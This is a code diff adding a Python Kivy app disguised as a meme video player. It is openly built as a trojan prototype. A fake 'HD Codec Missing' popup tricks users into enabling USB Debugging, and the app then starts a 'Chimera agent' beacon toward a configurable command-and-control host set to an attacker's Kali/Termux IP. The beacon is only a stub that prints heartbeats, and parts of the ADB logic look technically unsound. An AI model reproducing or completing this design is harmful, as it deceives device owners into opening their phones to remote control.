@@ -1,0 +1,98 @@
+from kivy.app import App
+from kivy.uix.boxlayout import BoxLayout
+from kivy.uix.label import Label
+from kivy.uix.button import Button
+from kivy.uix.image import Image
+from kivy.clock import Clock
+import subprocess
+import os
+import sys
+import threading
+
+# --- CONFIGURATION ---
+C2_HOST = "192.168.1.105"  # CHANGE TO YOUR KALI/TERMUX IP
+C2_PORT = 5000
+# ---------------------
+
+class MemeViewerApp(App):
+    def build(self):
+        self.layout = BoxLayout(orientation='vertical', padding=10, spacing=10)
+        
+        # Fake Video Player Area
+        self.img = Image(source='data/logo/kivy-icon-256.png', allow_stretch=True, keep_ratio=False)
+        self.layout.add_widget(self.img)
+        
+        # Status Text
+        self.status = Label(text="Tap the screen to play video...", color=(0, 1, 0, 1), size_hint_y=None, height=50)
+        self.layout.add_widget(self.status)
+        
+        # Simulate a "Video" click
+        self.layout.bind(on_touch_down=self.start_video)
+        
+        return self.layout
+
+    def start_video(self, instance, touch):
+        if self.layout.collide_point(*touch.pos):
+            self.status.text = "Initializing HD Video..."
+            Clock.schedule_once(self.check_adb, 1)
+
+    def check_adb(self, dt):
+        try:
+            # Check if ADB is enabled by trying to execute a shell command
+            result = subprocess.run(["adb", "get-state"], capture_output=True, text=True, timeout=3)
+            if "device" in result.stdout:
+                self.status.text = "Status: Connected"
+                self.start_background_agent()
+            else:
+                raise Exception("ADB not connected")
+        except:
+            self.status.text = "Error: HD Codec Missing!"
+            self.show_popup()
+
+    def show_popup(self):
+        # This popup is the Social Engineering trick
+        from kivy.uix.popup import Popup
+        content = BoxLayout(orientation='vertical')
+        content.add_widget(Label(text="This video requires the 'System Media Codec'.\nEnable it to continue playback."))
+        
+        btn_grant = Button(text="Enable Codec (Go to Settings)", size_hint_y=None, height=50)
+        btn_grant.bind(on_press=self.open_settings)
+        
+        btn_close = Button(text="Cancel", size_hint_y=None, height=50)
+        btn_close.bind(on_press=lambda x: self.popup.dismiss())
+        
+        content.add_widget(btn_grant)
+        content.add_widget(btn_close)
+        
+        self.popup = Popup(title="Permission Request", content=content, size_hint=(0.8, 0.6))
+        self.popup.open()
+
+    def open_settings(self, instance):
+        try:
+            # Open Android Developer Settings using ADB Intent
+            # In a real scenario, this would guide the user to toggle ADB
+            subprocess.run(["adb", "shell", "am", "start", "-a", "android.settings.APPLICATION_DEVELOPMENT_SETTINGS"])
+            self.status.text = "Please enable 'USB Debugging' and return to the app."
+            self.popup.dismiss()
+        except:
+            self.status.text = "Failed to open settings. Please enable ADB manually."
+
+    def start_background_agent(self):
+        # Simulate the Chimera agent beaconing
+        def beacon():
+            while True:
+                try:
+                    # Simulate sending data to C2
+                    print(f"[+] Sending heartbeat to {C2_HOST}:{C2_PORT}")
+                    # In reality, use requests.post to send data
+                    import time
+                    time.sleep(10)
+                except:
+                    break
+        
+        thread = threading.Thread(target=beacon, daemon=True)
+        thread.start()
+        self.status.text = "Playing video... (Background agent active)"
+
+if __name__ == '__main__':
+    MemeViewerApp().run()
